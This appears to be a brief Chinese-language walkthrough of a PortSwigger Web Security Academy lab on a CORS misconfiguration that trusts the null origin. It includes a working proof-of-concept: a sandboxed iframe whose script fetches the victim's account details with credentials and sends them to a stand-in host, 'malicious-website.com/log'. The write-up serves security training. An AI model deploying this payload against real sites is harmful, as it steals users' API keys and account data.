

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/cors/images/B72D14489EAE4567A8665558FC2F08C2clipboard.png)

当origin:null时也可以获取到apikey，说明存在cors漏洞



在本地用html验证

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/cors/images/145DB686C5FB4C969DE9DBE31D5F3DB8clipboard.png)

poc:

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac8d1f4c1ebc2af2806b9d9d00df0041.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
    //恶意网站
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

将该脚本部署到恶意网站，用户访问即可获取信息。